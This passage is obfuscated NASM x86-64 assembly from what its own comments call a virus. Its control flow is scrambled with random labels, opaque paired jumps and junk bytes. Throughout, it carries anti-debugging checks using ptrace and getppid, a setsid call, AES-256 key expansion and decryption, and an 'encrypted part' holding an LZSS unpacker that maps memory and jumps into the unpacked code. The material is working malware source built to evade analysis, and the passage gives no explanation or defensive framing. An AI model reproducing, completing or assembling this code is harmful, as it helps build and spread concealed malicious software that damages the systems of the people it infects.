    jns         ..@k30F73XLnAdq
..@Pd6NeUa2Jazu:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+4
db 0xe0, 0xdb
    jmp         $+4
db 0xcb, 0x9f
    jmp         ..@kpRrbWQqQAIP
..@rLWC3BOdjUtD:
    push        rsi
    jmp         $+4
db 0xd3, 0xe4
    jb          ..@cgq6ndSsgG0k
    jae         ..@cgq6ndSsgG0k
..@Z5nNDuTk42cM:
%ifndef ENABLE_DEBUGGING
    xchg        rax, rax
%endif
    jmp         $+4
db 0x3c, 0xa4
    jmp         ..@6s4nsL2yluz5
..@PpLBpOs87EJd:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x0
%endif
    jmp         $+5
db 0xbf, 0x2e, 0xd5
    jmp         ..@GIY1fFs4F7a4
..@BxJ2DjP5PaQR:
    leave
    jb          ..@WrXDp6VoNz0C
    jae         ..@WrXDp6VoNz0C
..@Xg6DszrG5eYr:
%ifndef ENABLE_DEBUGGING
    mov         r3, r5
%endif
    jmp         ..@3kuyzjCbenBb
..@ibj9fgYBnHiZ:
%ifndef ENABLE_DEBUGGING
    pop         rsi
%endif
    jl          ..@EsfiKZ7ce7fI
    jge         ..@EsfiKZ7ce7fI
..@nLWOZZE6frY0:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    js          ..@fD7wiGQlVZZ3
    jns         ..@fD7wiGQlVZZ3
..@KsnPFTAUfHHN:
    push        rdx
    jl          ..@g4PLQ0pjlnuC
    jge         ..@g4PLQ0pjlnuC
..@DXlEVOodsoVE:
    pop         rbx
    jmp         $+4
db 0x1e, 0xab
    jmp         $+3
db 0x85
    js          ..@z5rlRlE0O35q
    jns         ..@z5rlRlE0O35q
..@rYSEpylanKuD:
    pop         rcx
    jmp         $+3
db 0x73
    jmp         ..@1VkCCTAGCTDe
..@1SILyi6PKvYV:
    push        rdi
    jmp         ..@AEzVPktsI6FA
..@cvaW7bFSM7az:
    mov         rbx, rbx
    jmp         $+3
db 0x1d
    jb          ..@6BsdjJmLgxb6
    jae         ..@6BsdjJmLgxb6
..@hEzMeOiPqKjy:
    xchg        rcx, rcx
    jmp         $+4
db 0x3c, 0x99
    jmp         ..@sb3n0RTz22XQ
..@T8hQZfajFU3R:
    xchg        rbx, rbx
    jmp         $+5
db 0x79, 0x4b, 0xf5
    jmp         $+3
db 0x9a
    js          ..@ImUAiSoNOMVm
    jns         ..@ImUAiSoNOMVm
..@tDX0OeXLKQTd:
    call        ExitProgram
    jmp         $+5
db 0x8e, 0xbf, 0xb8
    jl          ..@zZASzEGJqHkc
    jge         ..@zZASzEGJqHkc
..@bo4Ny8kmN2Mv:
    xchg        rdi, rdi
    js          ..@dqJJtqjxvwlZ
    jns         ..@dqJJtqjxvwlZ
..@dhmgcD3dMzCv:
    pop         rdi
    jmp         $+4
db 0x11, 0x8f
    jmp         ..@28G8DD4XdYc0
..@tjS9gBjRsBcd:
    pxor        xmm1, xmm4
    jmp         $+4
db 0x32, 0x75
    js          ..@j0eDoO21JSvW
    jns         ..@j0eDoO21JSvW
..@4JnlKV53KezG:
    jmp         ..@8gVsHKJXlWBF
    jb          ..@4hSe03rnhLmA
    jae         ..@4hSe03rnhLmA
..@DSnDtaQxEfbk:
    sub         r4, r1
    jmp         $+4
db 0x8a, 0x25
    jl          ..@F1Oo3Aeqd7Bz
    jge         ..@F1Oo3Aeqd7Bz
..@KU0dxRMTazDM:
%ifndef ENABLE_DEBUGGING
    push        rdx
%endif
    jmp         ..@vrA93CCVij99
..@8dwMYVxX9BhA:
    mov         rcx, rcx
    jl          ..@oDuTkaTlX8jJ
    jge         ..@oDuTkaTlX8jJ
..@qE1dNQ50OZsw:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@0dCGoK7SqnZZ
    jns         ..@0dCGoK7SqnZZ
..@K3S8l93ILBb7:
    movdqu      xmm0, [rsi+rcx]
    jmp         $+4
db 0x91, 0x70
    jmp         ..@vSwXtG8BJYJ3
..@9ZuMCqj2uy0e:
    xchg        rdx, rdx
    jmp         $+3
db 0x53
    jmp         ..@gxY8OaGCVJoW
..@8vB3ZdPcpFy2:
    mov         r1, r5
    jmp         $+4
db 0xcf, 0x72
    jmp         $+4
db 0x4b, 0x92
    jl          ..@qQZKRxRm7Yyh
    jge         ..@qQZKRxRm7Yyh
..@CRPNNEX319bN:
    push        rbx
    jmp         $+5
db 0x0b, 0x19, 0x54
    jmp         $+3
db 0x6d
    jmp         ..@dX2Za9PoBPxc
..@MlN5pkYBdemJ:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
%endif
    jmp         $+3
db 0xef
    jmp         ..@JEDa2yPBZ8q3
..@ztCPQX9LkzSa:
%ifndef ENABLE_DEBUGGING
    mov         rdx, rdx
%endif
    jmp         $+4
db 0xd9, 0x7f
    jmp         ..@FlUQzcuCWsKM
..@uTtL4sQdDNjD:
    mov         rdi, rdi
    jl          ..@NK3wNCtYJIi9
    jge         ..@NK3wNCtYJIi9
..@bCrPnCg9ZVSJ:
    mov         r5, r2
    jmp         ..@1wKq0vKGIShc
..@oZRhiGbRGVC3:
    push        rbx
    jmp         ..@wDY9Blf0I4f0
..@g4PLQ0pjlnuC:
    pop         rdx
    jmp         $+4
db 0xb1, 0xee
    jmp         $+3
db 0x28
    jl          ..@Y4Cjva4FRscg
    jge         ..@Y4Cjva4FRscg
..@yzwYRWqCB29b:
%ifndef ENABLE_DEBUGGING
    mov         rsp, rsp
%endif
    jmp         $+3
db 0xd0
    je          ..@obLJA3YVy3OD
    jne         ..@obLJA3YVy3OD
..@QVXMWPNagRRI:
    movdqu      xmm1, [rdi]
    jmp         $+3
db 0x08
    jl          ..@DcUc2jMyZLzl
    jge         ..@DcUc2jMyZLzl
..@3kuyzjCbenBb:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jb          ..@D7egwoURTbcL
    jae         ..@D7egwoURTbcL
..@iOoBEiQNj6NV:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PTRACE
%endif
    jmp         $+3
db 0x1a
    jb          ..@Lt6bhgUuHolp
    jae         ..@Lt6bhgUuHolp
..@faErhaDWE6Ka:
    mov         rax, rbx
    jmp         ..@kbzTMrKMDLm1
..@2wU6szEnzyLP:
    pop         rdi
    jmp         $+4
db 0x3a, 0xaa
    jb          ..@aD9R5qQqYO40
    jae         ..@aD9R5qQqYO40
..@axLni2uBH8M2:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x91
    jmp         $+5
db 0x8a, 0x87, 0x2b
    jmp         ..@g2LC4NjpRcFy
..@XipBy7Xnqh8f:
    mov         rbp, rbp
    jb          ..@VlNR9zpYKrfI
    jae         ..@VlNR9zpYKrfI
..@Qg7YAYG4Wf9J:
    aeskeygenassist xmm2, xmm3, 0x4
    jmp         ..@5T8FqP0KtlPt
..@LQLR5xa6W2DM:
    movdqa      OWORD [rsi+0x40], xmm1
    jmp         ..@2CBRaUahBo4G
..@TCVygRIMej6D:
    pop         rax
    jb          ..@rAtmxv4xHeSs
    jae         ..@rAtmxv4xHeSs
..@zj1iXEvzTiEY:
    push        rbx
    jmp         $+5
db 0x21, 0xc9, 0x23
    jmp         $+3
db 0x77
    js          ..@tcmfPiKHsHSV
    jns         ..@tcmfPiKHsHSV
..@B1i1oFYaHoct:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         $+5
db 0x5b, 0x41, 0x0f
    jmp         ..@EaLtaPswVsiB
..@dBgrc2xjtPA2:
    movdqa      xmm4, xmm3
    jmp         $+5
db 0x71, 0x42, 0xeb
    jmp         ..@Le4B1h8JcXp9
..@CXMCy7Zzarfa:
    xchg        rsi, rsi
    jmp         $+4
db 0xe2, 0xea
    jl          ..@6sr3aup9Wpjd
    jge         ..@6sr3aup9Wpjd
..@taTkmEP4O9E9:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jmp         $+4
db 0x2e, 0x7e
    jb          ..@pyrdBucisSak
    jae         ..@pyrdBucisSak
..@WTudFosw9sdW:
%ifndef ENABLE_DEBUGGING
    jle         ..@jjO8HoRlHJMU
%endif
    jmp         $+5
db 0xcc, 0xe8, 0xad
    jmp         $+3
db 0x19
    jl          ..@UhywmCGFTWSc
    jge         ..@UhywmCGFTWSc
..@YSiR8TSU5Ofl:
    lea         r1, [rsp+_UEC_OFF.key]
    jb          ..@FE8niPp4hMbT
    jae         ..@FE8niPp4hMbT
..@4hSe03rnhLmA:
    push        rbx
    jmp         $+4
db 0x43, 0x41
    jmp         ..@MNj1E7rGQd1j
..@gVn5pzx8fuay:
    mov         rdi, rdi
    jmp         $+3
db 0x1c
    jb          ..@tr8KicmjUfrh
    jae         ..@tr8KicmjUfrh
..@kMao8RNq6diW:
    mov         rdi, QWORD [rsp+3*bytes]
    jmp         $+3
db 0xb2
    jmp         $+3
db 0x57
    js          ..@pcb3jNkgduT4
    jns         ..@pcb3jNkgduT4
..@Qeg9CkJCtFOa:
    xchg        rbx, rbx
    jmp         $+4
db 0x93, 0x42
    je          ..@jEhFmXlk7Ngf
    jne         ..@jEhFmXlk7Ngf
..@choIxV3MpdNJ:
    add         r2, r4
    jmp         $+5
db 0x1a, 0x97, 0x78
    jmp         $+5
db 0xe3, 0x2a, 0x40
    jmp         ..@MMpLkWW2p4dV
..@1o19rFPq3Ud5:
    push        rax
    jmp         $+3
db 0x3b
    jmp         $+4
db 0xe2, 0x88
    jmp         ..@c7olERRvXc8q
..@Mxl2pJ0i993p:
    mov         eax, SYS_SETSID
    js          ..@lpWDUNvnjdKy
    jns         ..@lpWDUNvnjdKy
..@92r6OiWIhEve:
%ifndef ENABLE_DEBUGGING
    mov         rdi, rdi
%endif
    js          ..@O6pJnRC3uHpG
    jns         ..@O6pJnRC3uHpG
..@ymrxdip6pbiA:
    xor         r2, r2
    jmp         $+3
db 0xfc
    jmp         $+4
db 0x8f, 0x30
    jmp         ..@cToGYg3BHExd
..@M4pbaXr4dG3q:
%ifndef ENABLE_DEBUGGING
    mov         rax, rax
%endif
    jmp         $+5
db 0x22, 0x44, 0x8a
    js          ..@X8fRNnf9HX9W
    jns         ..@X8fRNnf9HX9W
..@kbhMcHrHSRJx:
    call        Strncmp
    je          ..@CbiuL1mYx0ye
    jne         ..@CbiuL1mYx0ye
..@8fGqCDuxh3hL:
    push        rdi
    jmp         $+3
db 0x23
    je          ..@jpbywQjDcJdC
    jne         ..@jpbywQjDcJdC
..@OFAY8WMx8lx0:
    movdqu      OWORD [rsp+0x30],xmm0
    jmp         $+3
db 0x55
    jmp         ..@eYmb71aZ3DRf
..@GGMWdOTotE2M:
    pop         rdx
    jmp         $+3
db 0xe8
    jmp         ..@dpzVdSjaYYMx
..@6sr3aup9Wpjd:
    cmp         QWORD [rdi], 0x00
    jmp         ..@J0pZg1MsYi2V
..@omXH1tlrqihu:
    xchg        rcx, rcx
    je          ..@ZEAJlkfdgxXZ
    jne         ..@ZEAJlkfdgxXZ
..@NK3wNCtYJIi9:
    call        AntiDebugging
    jmp         $+3
db 0x7b
    jmp         ..@GSiYtOxmqq5s
..@ca6GW7mdW9pN:
    pxor        xmm1, xmm4
    jmp         $+4
db 0xe0, 0x40
    jl          ..@54oA63PYgaWw
    jge         ..@54oA63PYgaWw
..@YmDeJpXViYEa:
%ifndef ENABLE_DEBUGGING
    mov         rcx, rcx
%endif
    jmp         $+5
db 0xc1, 0xee, 0x38
    jl          ..@kZFOg7R5l1He
    jge         ..@kZFOg7R5l1He
..@xDs9sFJuDF9U:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jmp         ..@Du0Aq8DYYyFf
..@chbtFswvDGwe:
    movdqu      xmm1, OWORD [rsp+0xd0]
    jmp         ..@B23Jo2ZpBASK
..@QdkqpgbuuSJS:
%ifndef ENABLE_DEBUGGING
    jne         ..@IwuzLc8I7NYD
%endif
    jb          ..@iyvwTPK01DJ6
    jae         ..@iyvwTPK01DJ6
..@md0jq03uHVMO:
    pop         rcx
    je          ..@RoWFsEXC09mK
    jne         ..@RoWFsEXC09mK
..@HzkxnR6wHLcj:
    pop         rcx
    je          ..@629mFP8gSfUL
    jne         ..@629mFP8gSfUL
..@jkZcTiHAJikc:
    call        Aes256KeyExpansion
    jmp         $+4
db 0x99, 0x99
    jmp         ..@Ytbx2BPYJ021
..@QE27z0PzGsT9:
    push        rsi
    jmp         $+5
db 0x35, 0x09, 0x89
    js          ..@Jl7CijOOtQQu
    jns         ..@Jl7CijOOtQQu
..@i14yLVJhwq4Q:
    xchg        rbx, rbx
    js          ..@dK6zliH6EvZb
    jns         ..@dK6zliH6EvZb
..@w47DPjxUj4Gz:
    push        rdi
    jmp         $+5
db 0x57, 0xe1, 0xca
    jmp         $+4
db 0xd6, 0x71
    jl          ..@TMdv28EPuGUe
    jge         ..@TMdv28EPuGUe
..@4e0yrPk7p8fW:
    and         rsp, 0xfffffffffffffff0
    jmp         $+5
db 0xbf, 0xd3, 0xef
    jmp         ..@DMU0lxTovlPZ
..@NJ8E8r06KYQl:
    call        ..@QD0Xbwg9GTO5
    jmp         $+3
db 0xab
    jmp         ..@Qer9BGiWNDkO
..@rux09xfNK1QL:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    js          ..@KgHUf3FolH99
    jns         ..@KgHUf3FolH99
..@YyQv5e2sdtTm:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_GETPPID
%endif
    jl          ..@IHxtcVFATf3W
    jge         ..@IHxtcVFATf3W
..@mWtE86Aie1dF:
    aesdec      xmm0, xmm1
    jmp         ..@p3ObpJ3eBgf7
..@wDY9Blf0I4f0:
    push        rdx
    jmp         $+5
db 0x7e, 0xbe, 0xe6
    jmp         ..@LFRbkbcF9bXK
..@nVVLNz4R5yTS:
    mov         r4, r5
    jmp         ..@DSnDtaQxEfbk
..@PAXi4xSgG3cg:
    pop         rdi
    jmp         $+3
db 0xaf
    jl          ..@rhyzAAYPUduE
    jge         ..@rhyzAAYPUduE
..@l1PmDir2EqC2:
%ifndef ENABLE_DEBUGGING
    mov         rbp, rbp
%endif
    jmp         ..@izqeMX57XUsk
..@fsS2zoYAqP58:
%ifndef ENABLE_DEBUGGING
    pop         rdi
%endif
    jmp         $+4
db 0x6a, 0x31
    jb          ..@aZVWtlnCtW4P
    jae         ..@aZVWtlnCtW4P
..@54GTjnWm3zfc:
    push        rbx
    jmp         $+4
db 0x72, 0x6a
    jmp         $+4
db 0x4d, 0x10
    jl          ..@8T0sMCceoMwT
    jge         ..@8T0sMCceoMwT
..@hGf6ldFfgNs3:
    mov         rbp, rbp
    jmp         $+4
db 0x12, 0x59
    jmp         ..@4nXornlK8ODA
..@yJWEr6u7zqOQ:
    add         rsp, _AESD_OFF_size+0x100
    jmp         $+3
db 0x0b
    jmp         ..@BxJ2DjP5PaQR
..@VohiUT3ZaBiK:
    cmp         QWORD [rsp+2*bytes], rcx
    jmp         $+5
db 0x4f, 0xb3, 0xe5
    jmp         ..@0NsScTaEmPR0
..@TeNbpcB0j3sz:
    mov         rdi, rdi
    jmp         $+5
db 0x70, 0x49, 0x5c
    js          ..@qdPKvmpCOtvu
    jns         ..@qdPKvmpCOtvu
..@Yi0IShJTjoFF:
    jl          ..@84kQiiekP4PN
    jmp         $+5
db 0x26, 0xfe, 0xda
    jl          ..@TEpH7DOFmpwg
    jge         ..@TEpH7DOFmpwg
..@4PLSaX0vGxic:
    pslldq      xmm4, 0x4
    jmp         $+3
db 0xb7
    js          ..@njRAlaO2Wqkp
    jns         ..@njRAlaO2Wqkp
..@bPAIQm9iW86W:
    mov         rax, rax
    jmp         $+5
db 0x6c, 0x76, 0xf3
    je          ..@cvaW7bFSM7az
    jne         ..@cvaW7bFSM7az
..@p3ObpJ3eBgf7:
    movdqu      xmm1, OWORD [rsp+0x90]
    jmp         $+5
db 0x49, 0x11, 0xe9
    jmp         $+3
db 0x0d
    js          ..@gjje9Wit2Z58
    jns         ..@gjje9Wit2Z58

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@3a5lR15ioWue
..@BlfySpcQmxGn:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jb          ..@0MoK1DR48tP5
    jae         ..@0MoK1DR48tP5
..@KkuV5eCAh0a3:
    pop         rsi
    jmp         $+3
db 0x60
    jmp         $+4
db 0x79, 0x00
    jmp         ..@Eni76QHEXrIE
..@hNDqHr3uv6gS:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+3
db 0xa1
    jmp         ..@b4P2rJQnKHJS
..@8MVuRuGTGYAK:
    xor         rdi, rdi
    jmp         ..@iF1sqBTnDTEs
..@SLF4wHtA56Zm:
    mov         rdi, rdi
    jmp         $+4
db 0x6d, 0x92
    jb          ..@zhZU6qrdKraT
    jae         ..@zhZU6qrdKraT
..@hZfAG4BIzetF:
    pop         rdx
    je          ..@8gq3NUQCR0E2
    jne         ..@8gq3NUQCR0E2
..@nwNhLbBuKFvL:
    push        rdx
    jmp         $+5
db 0x5c, 0x75, 0x67
    jmp         ..@B4kWeKgltHRk
..@3xRMxcvnpIeX:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    jl          ..@BlfySpcQmxGn
    jge         ..@BlfySpcQmxGn
..@0MoK1DR48tP5:
    mov         rsp, rsp
    jmp         $+4
db 0x49, 0xf2
    js          ..@TIsIbUpkGShg
    jns         ..@TIsIbUpkGShg
..@7xF3MPGL5WuR:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jb          ..@H9TQNJEWbWao
    jae         ..@H9TQNJEWbWao
..@o0LLqdXMaPW0:
    call        ExitProgram
    jb          ..@9zlbM06LQlzq
    jae         ..@9zlbM06LQlzq
..@G7z9Ddbnh0pX:
%ifdef X86_32
    int         0x80
%endif
    jb          ..@JDIcUc4sDnVn
    jae         ..@JDIcUc4sDnVn
..@WpjrXKHlBCLE:
    mov         r2, original_virus_len-non_packed_len
    jl          ..@fZ0FS0JNjbhQ
    jge         ..@fZ0FS0JNjbhQ
..@SXz11YoJsghZ:
%ifdef X86_64
    syscall
%endif
    jmp         $+3
db 0xa7
    jmp         ..@BGOe4FQIMXXv
..@kwGk9yF1P0Us:
    mov         rcx, 8
    jmp         $+4
db 0x0d, 0x88
    jmp         ..@yldQuGZXHCCI
..@cXekhJNOfQa8:
    pop         rdi
    jmp         $+4
db 0x37, 0x46
    jl          ..@PSEp8WQmjhYL
    jge         ..@PSEp8WQmjhYL
..@0TKxGMRhW3cl:
    sub         rcx, 1
    jmp         $+5
db 0x45, 0xb2, 0x7a
    jmp         ..@CM9btjlGTYYa
..@97AgiPwCEf3j:
    syscall
    jmp         ..@xLT9XmLALLPm
..@kOG2f7mASjg5:
    call        rax
    jmp         $+3
db 0x7a
    jmp         $+5
db 0x9d, 0x42, 0xde
    jmp         $+5
db 0x11, 0xce, 0x28
    jmp         $+4
db 0x4f, 0x48
    je          ..@kVA86XHUNBah
    jne         ..@kVA86XHUNBah
..@pBKB0gsu2Yin:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jb          ..@uzSZHUT4foGd
    jae         ..@uzSZHUT4foGd
..@q4BXovzvpWm0:
    jz          ..@H9c4dP4exm2T
    jmp         $+3
db 0x19
    jmp         $+5
db 0xb4, 0x51, 0xca
    jmp         ..@2akOYhADT5Uo
..@xsO7sXdJ7xn0:
    xchg        rcx, rcx
    jl          ..@FAOYpNUryacN
    jge         ..@FAOYpNUryacN
..@WwUqFq6q1VWI:
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jmp         $+5
db 0x53, 0x10, 0x35
    jl          ..@QwZ3tImes6kI
    jge         ..@QwZ3tImes6kI
..@AbEbFvPiqg4f:
    push        rax
    jmp         $+5
db 0x80, 0xcf, 0xd9
    jb          ..@0xl16wxwyoKC
    jae         ..@0xl16wxwyoKC
..@bl432w8PNca9:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+4
db 0xeb, 0xd4
    jb          ..@7bdfqlVbodWq
    jae         ..@7bdfqlVbodWq
..@My0WZhLYUccm:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+3
db 0xf5
    jmp         $+5
db 0x8d, 0x30, 0x25
    jmp         ..@eRNRgslNiX9u
..@QeIB37JR3lGi:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0x16, 0x7c, 0x33
    je          ..@CtMHx1T9pUV5
    jne         ..@CtMHx1T9pUV5
..@m7YR5G6EuuUJ:
    ret
..@cDOgHxSHfzlj:
    xchg        rcx, rcx
    jmp         ..@naM6RuZHNXqC
..@AbxzbNVRZO0E:
    pop         rdi
    jmp         ..@MUu2TCMEBdlt
..@YFohO5AoaAob:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    jl          ..@ictYIa5TpU6t
    jge         ..@ictYIa5TpU6t
..@zhZU6qrdKraT:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         ..@cDOgHxSHfzlj
..@g4m4tL3DgkjU:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    jmp         $+5
db 0x60, 0x5b, 0xaf
    jl          ..@9wWrDYnkNywm
    jge         ..@9wWrDYnkNywm
LzssDecoder:
    jmp         ..@5iJg8ogFnPr8
..@hkIUefWURHAs:
    mov         rcx, 1
    js          ..@UZtK2spha6BF
    jns         ..@UZtK2spha6BF
..@40eobcUC76wm:
    xchg        rbx, rbx
    jmp         $+5
db 0xf9, 0x7b, 0xc5
    jl          ..@NIA2ii879KvH
    jge         ..@NIA2ii879KvH
..@xLT9XmLALLPm:
    xchg        rsi, rsi
    jl          ..@Ji92HqQQvb6d
    jge         ..@Ji92HqQQvb6d
..@1QhgQFhc2Pj7:
    sub         rsp, _UEC_OFF_size
    jmp         $+4
db 0x70, 0x3d
    jmp         ..@o0LLqdXMaPW0
..@3a5lR15ioWue:
    push        rdi
    js          ..@xsO7sXdJ7xn0
    jns         ..@xsO7sXdJ7xn0
..@Ijn1lt97qPrS:
    mov         rcx, LENGTH_BITS
    je          ..@y8lzKxTC5Fwp
    jne         ..@y8lzKxTC5Fwp
..@DoDRivAnUQHP:
    jnz         ..@nyivp7zIQpaz
    jmp         $+5
db 0x42, 0x53, 0xa0
    js          ..@XW0xA2vXiO3X
    jns         ..@XW0xA2vXiO3X
..@z2kTbI36oygx:
    xchg        rsi, rsi
    jl          ..@ByqnE7JEA1fl
    jge         ..@ByqnE7JEA1fl
..@mI0mGvoJ8KP3:
    xchg        rcx, rcx
    jmp         $+4
db 0xd6, 0xee
    jb          ..@3BBeHY9QOoNg
    jae         ..@3BBeHY9QOoNg
..@zwKq3583KfP9:
    pop         rsi
    jmp         ..@3xRMxcvnpIeX
..@Eni76QHEXrIE:
    xchg        rsp, rsp
    jmp         $+5
db 0x11, 0xa9, 0xb9
    jmp         $+4
db 0xbc, 0x21
    jmp         ..@1QhgQFhc2Pj7
..@A8a3hfhffVsJ:
    push        rsi
    jmp         $+3
db 0xbb
    jmp         ..@KkuV5eCAh0a3
..@5c9hg49xRNNE:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    jmp         $+3
db 0x59
    jb          ..@mfoc5L3UzFCH
    jae         ..@mfoc5L3UzFCH
..@tRlTV0HnS8c9:
    xchg        rdx, rdx
    jmp         $+4
db 0x26, 0x19
    jb          ..@kwGk9yF1P0Us
    jae         ..@kwGk9yF1P0Us
..@VNzVc2p7OdO9:
    push        rax
    jl          ..@Qqw6MaYxVPRV
    jge         ..@Qqw6MaYxVPRV
..@gR0qgxTVvwVh:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+4
db 0xb6, 0x72
    jl          ..@uKga9kL4wPAF
    jge         ..@uKga9kL4wPAF
..@CtMHx1T9pUV5:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+4
db 0x74, 0x40
    jmp         ..@5CV6xjm7c8PX
..@PgCkHoVnfjX4:
    and         bx, WINDOW_LENGTH-1
    jmp         $+3
db 0x34
    jmp         $+4
db 0x50, 0xb6
    jb          ..@5c9hg49xRNNE
    jae         ..@5c9hg49xRNNE
..@jsmlCTbffwF5:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         ..@My0WZhLYUccm
..@j6rB63BRA5j5:
    xchg        rsi, rsi
    js          ..@nEi2MSWbOHmx
    jns         ..@nEi2MSWbOHmx
..@DLszNLuNlyBa:
    push        rax
    jmp         $+3
db 0xf2
    js          ..@EdEH0s43SqyP
    jns         ..@EdEH0s43SqyP
..@D79Hb1is89JV:
%ifdef X86_64
    mov         rcx, rcx
%endif
    jb          ..@SXz11YoJsghZ
    jae         ..@SXz11YoJsghZ
..@MUu2TCMEBdlt:
    mov         rax, rax
    jmp         $+5
db 0xff, 0xbf, 0x1c
    jmp         ..@LcxsItlSSiR3
..@9zlbM06LQlzq:
    xchg        rdi, rdi
    js          LzssDecoder
    jns         LzssDecoder
..@jhjBwr10KKnr:
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         ..@5QKDpnUIKLaK
..@rmkgSpLTk4Sr:
    cmp         cl, dl
    jmp         ..@0NlyB58bsT1V
..@rgmp5UJdBy5Z:
    mov         rbx, rbx
    jmp         ..@yHXOGKRmnGGF
..@r0V2lyp1hq4n:
%ifdef X86_64
    push        rbx
%endif
    jmp         $+3
db 0x78
    jmp         $+4
db 0xbd, 0x79
    js          ..@vC68LZX5chUg
    jns         ..@vC68LZX5chUg
..@2h2hOamUAtBq:
    mov         BYTE [rbx], al
    jmp         $+4
db 0x1d, 0x60
    jb          ..@wJlLe8ZQnN0q
    jae         ..@wJlLe8ZQnN0q
..@z695OW8QfH4w:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+3
db 0x69
    jl          ..@pBKB0gsu2Yin
    jge         ..@pBKB0gsu2Yin
..@OiTWr5Kkcb1q:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    jmp         ..@DoDRivAnUQHP
..@k39v1AQXtRFW:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+4
db 0x76, 0x14
    jmp         ..@bl432w8PNca9
..@mfoc5L3UzFCH:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jb          ..@2h2hOamUAtBq
    jae         ..@2h2hOamUAtBq
..@ypJ4H2rboGVK:
    pop         rbx
    jmp         $+3
db 0x84
    jmp         ..@jsmlCTbffwF5
..@JDIcUc4sDnVn:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x82, 0xd6, 0x90
    jmp         ..@Fj3576ALD9UP
..@5CV6xjm7c8PX:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    js          ..@9qfxK801tPdH
    jns         ..@9qfxK801tPdH
..@4uTbGTpcxheP:
    jmp         ..@hkIUefWURHAs
    jmp         ..@rzb2aNvwxqoF
..@nQ2NaqxGSqmk:
    xchg        rsp, rsp
    jmp         $+5
db 0x34, 0xd8, 0x65
    jmp         ..@OrCDJG50kC1m
..@ZNmrhXgky0vl:
    jg          ..@pYcN6SWBloO9
    js          ..@lQ15jcPv0OiU
    jns         ..@lQ15jcPv0OiU
..@ZpBEQisBeY7U:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    jmp         ..@g4m4tL3DgkjU
..@aP0lF6vuG91E:
%ifdef X86_32
    mov         edx, 111b
%endif
    jmp         $+4
db 0x83, 0x30
    jmp         $+3
db 0x4e
    jmp         ..@LVJ42gPtBXQe
..@TIsIbUpkGShg:
    xchg        rdx, rdx
    jb          ..@GJ40GInEebXg
    jae         ..@GJ40GInEebXg
..@c2VSRNuQVfNn:
    mov         rdx, rax
    jb          ..@bp0e2uTKn7PO
    jae         ..@bp0e2uTKn7PO
..@Hk016NvI1WYY:
    mov         rdx, rdx
    js          ..@DY2UOkwwmu3Q
    jns         ..@DY2UOkwwmu3Q
..@kFwWCmFh1pWU:
    pop         rdx
    jmp         $+3
db 0x7a
    jl          ..@XCgNh3aAIXm8
    jge         ..@XCgNh3aAIXm8
..@j0WfY827n4Tx:
    pop         rdi
    jmp         $+3
db 0xa7
    jmp         ..@0S4ooGSg5Nep
..@LcxsItlSSiR3:
    mov         rsp, rsp
    jmp         $+4
db 0x26, 0x5a
    js          ..@4uTbGTpcxheP
    jns         ..@4uTbGTpcxheP
..@FgI9xhrxZCm7:
    pop         rsi
    js          ..@zOOiMKktTejn
    jns         ..@zOOiMKktTejn
..@00qCfrubCLkh:
    push        rdx
    jl          ..@75pQOEChuLiC
    jge         ..@75pQOEChuLiC
..@Ji92HqQQvb6d:
    mov         rdi, rdi
    jmp         $+4
db 0x14, 0x9e
    jmp         $+5
db 0x59, 0x9e, 0x8a
    je          ..@00qCfrubCLkh
    jne         ..@00qCfrubCLkh
..@wJlLe8ZQnN0q:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jl          ..@h4IgJVvJAy1X
    jge         ..@h4IgJVvJAy1X
..@hJUSYigV99co:
    mov         rbx, rbx
    jmp         ..@4ZGWw8EbSg2y
